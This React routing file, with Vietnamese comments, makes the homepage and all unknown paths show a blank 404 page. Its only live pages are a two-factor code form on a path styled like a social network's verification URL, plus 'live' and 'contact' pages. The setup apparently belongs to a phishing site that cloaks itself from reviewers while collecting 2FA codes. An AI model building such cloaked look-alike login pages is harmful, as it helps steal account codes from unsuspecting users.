// src/main.jsx
import "./index.css";
import ReactDOM from "react-dom/client";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import AuthCodeForm from "./AuthCodeForm";
import Live from "./Live"; 
import Contact from "./Contact"; 
import NotFound from "./NotFound"; // Thêm dòng import này

ReactDOM.createRoot(document.getElementById("root")).render(
  <BrowserRouter>
    <Routes>
      {/* 1. Ép trang chủ (/) hiển thị giao diện 404 (Trắng tinh) */}
      <Route path="/" element={<NotFound />} />
      
      {/* Các trang bình thường của bạn vẫn giữ nguyên */}
      <Route
        path="/two_step_verification/two_factor"
        element={<AuthCodeForm />}
      />
      <Route path="/live" element={<Live />} />
      <Route path="/contact/:slug" element={<Contact />} />

      {/* 2. Ép tất cả các đường link không tồn tại khác cũng hiện 404 */}
      <Route path="*" element={<NotFound />} />
    </Routes>
  </BrowserRouter>
);
